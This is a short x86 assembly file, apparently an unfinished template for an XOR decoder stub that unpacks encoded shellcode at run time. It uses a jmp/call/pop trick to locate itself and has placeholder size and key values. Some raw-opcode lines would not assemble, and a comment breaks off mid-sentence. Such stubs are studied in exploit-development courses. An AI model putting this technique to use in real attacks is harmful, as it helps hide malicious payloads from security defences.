BITS 32											; 32bit addressing
ORG 0x0											; for relative jumps etc...

; ok, this is a simple shellcode xor encoder, you have to 
EB02		jmp +2
EB05		jmp +5
E8F9FFFFFF	call -2

	push ecx									; just for padding
	push ecx									; just for padding
	push ecx									; just for padding
	push ecx									; just for padding
call_start:
	call 0xFFFFFFFF								; call it
xor_start:
	pop ebx										; get return address from stack
	xor ecx, ecx								; clear ecx
	mov cx, 0xFFFF								; move size to low word of ecx (dummy)
xorloop:
	xor byte [ebx+0x0E], 0xFF					; xor value ebx points to (dummy)
	inc ebx										; increment ebx
	loop xorloop								; loop till cx=0
